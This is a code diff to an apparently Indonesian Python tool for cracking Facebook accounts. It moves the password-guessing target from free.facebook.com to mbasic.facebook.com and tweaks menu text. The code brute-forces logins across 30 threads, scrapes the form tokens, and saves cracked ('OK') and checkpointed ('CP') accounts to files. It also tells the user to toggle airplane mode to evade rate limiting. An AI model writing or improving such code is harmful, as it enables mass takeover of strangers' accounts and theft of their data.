@@ -471,7 +471,7 @@ def setting():
 		exit()
 	met = '# PILIH METHOD CRACK'
 	sol().print(mark(met, style='purple'))
-	ioz = '[01] Methode B-Api (Cepat)\n[02] Methode Mobile (Hasil lIVE/OK)\n[03] Methode Free FB/koyo huri (LEMOT)'
+	ioz = '[01] Methode B-Api (Cepat)\n[02] Methode Mobile (Hasil lIVE/OK)\n[03] Methode mbasic (SUE)'
 	gess = nel(ioz, style='purple')
 	cetak(nel(gess, title='METHOD'))
 	hc = input(x+'['+p+'f'+x+'] Pilih : ')
@@ -483,12 +483,12 @@ def setting():
 		method.append('mobile')
 	guw = '# PILIHAN OPSI CRACK '
 	sol().print(mark(guw, style='purple'))
-	aplik = input(x+'['+p+'f'+x+'] Tampilkan Appl terkait? [ Not Recommended ] (y/t) : ')
+	aplik = input(x+'['+p+'f'+x+'] Tampilkan Appl terkait? Dalam perbaikan/seng kober  [ Not Recommended ] (y/t) : ')
 	if aplik in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
+	osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? Dalam perbaikan/seng kober [ Not Recommended ] (y/t) : ')
 	if osk in ['y','Y']:
 		oprek.append('ya')
 	else:
@@ -498,7 +498,7 @@ def setting():
 def passwrd():
 	ler = '# CRACK PROCESS BEGINS, PRESS CTRL+Z TO STOP'
 	sol().print(mark(ler, style='lawn green'))
-	krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit, jika masih tidak ada hasil, silahkan banting hp mu lalu beli hp baru ya'%(okc,cpc)
+	krek = 'Hasil Live  Disimpan Ke : OK/%s\nHasil Check Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit, jika masih tidak ada hasil, silahkan banting hp mu lalu beli hp baru ya, kok di pek batine ae Gak gelem ganti HP'%(okc,cpc)
 	cetak(nel(krek, title='CRACK'))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -697,8 +697,8 @@ def crack3(idf,pwv):
 	for pw in pwv:
 		try:
 			tix = time.time()
-			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://free.facebook.com/login/?email='+idf).text
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
 			dataa ={
 'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
 'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
@@ -707,7 +707,7 @@ def crack3(idf,pwv):
 'email':idf,
 'pass':pw
 }
-			ses.headers.update({'Host': 'free.facebook.com',
+			ses.headers.update({'Host': 'mbasic.facebook.com',
 'cache-control': 'max-age=0',
 'upgrade-insecure-requests': '1',
 'origin': 'https://mbasic.facebook.com',
